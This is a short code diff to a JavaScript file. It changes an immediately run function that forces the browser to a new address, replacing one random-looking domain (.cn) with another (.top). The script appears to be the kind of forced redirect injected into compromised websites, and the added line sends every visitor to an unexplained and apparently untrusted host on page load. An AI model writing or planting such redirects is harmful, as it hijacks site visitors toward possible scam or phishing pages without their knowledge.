@@ -1,3 +1,3 @@
 (function() {
-    window['location'] = 'https://letsclsakr.cn/';
+    window['location'] = 'https://kuailekdisj.top/';
 })();
